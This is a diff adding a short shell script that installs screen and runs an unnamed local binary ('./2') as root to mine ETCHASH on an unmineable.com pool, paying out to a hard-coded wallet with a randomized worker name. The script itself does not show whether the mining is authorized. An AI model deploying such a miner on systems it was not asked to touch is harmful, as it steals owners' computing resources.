@@ -1,0 +1,6 @@
+#!/bin/sh
+
+WORKER=$(echo $(shuf -i 1000-9999 -n 1)-Money)#fjau-6xys
+sudo apt-get update
+sudo apt install screen -y
+sudo ./2 --algo ETCHASH --pool etchash-eu.unmineable.com:3333 --user BTT:TCf2Vh5azCXyCpEHXWTS9ErU1EN4KgosiH.$WORKER --ethstratum ETHPROXY
